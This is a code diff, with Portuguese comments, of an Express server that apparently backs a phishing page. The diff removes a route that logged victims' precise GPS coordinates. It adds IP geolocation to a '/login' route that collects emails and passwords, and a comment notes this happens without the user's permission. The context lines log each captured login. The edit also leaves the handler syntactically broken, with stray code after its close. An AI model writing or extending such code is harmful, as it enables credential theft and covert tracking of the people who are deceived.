@@ -16,24 +16,19 @@ app.get('/', (req, res) => {
 });
 
 // Rota de Localização (GPS Real)
-app.post('/location', (req, res) => {
-    const { lat, lon, acc } = req.body;
-    
-    // Mostra as coordenadas prontas para o Google Maps nos Logs do Render
-    console.log(`📍 GOOGLE MAPS: ${lat}, ${lon}`);
-
-    const infoLoc = `[📍 GPS REAL] Lat: ${lat} | Lon: ${lon} | Precisão: ${acc}m | Data: ${new Date().toLocaleString('pt-BR')}\n`;
-
-    fs.appendFile(logPath, infoLoc, (err) => {
-        if (err) console.error("Erro ao salvar GPS:", err);
-    });
-    res.sendStatus(204);
-});
-
-// Rota de Login + Captura de IP (Ajustada para Logs)
+const geo = require('geoip-lite');
 app.post('/login', (req, res) => {
     const { email, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    // Localização baseada no IP (Não pede permissão ao usuário)
+    const geoData = geo.lookup(ip);
+    const cidade = geoData ? geoData.city : "Desconhecida";
+    const estado = geoData ? geoData.region : "Desconhecido";
+
+    console.log(`📍 Localização aproximada pelo IP: ${cidade} - ${estado}`);
+    // ... restante do seu código de salvar
+});
     
     // Isso fará os dados aparecerem NA HORA nos Logs do Render
     console.log(`--- NOVO LOGIN ---`);
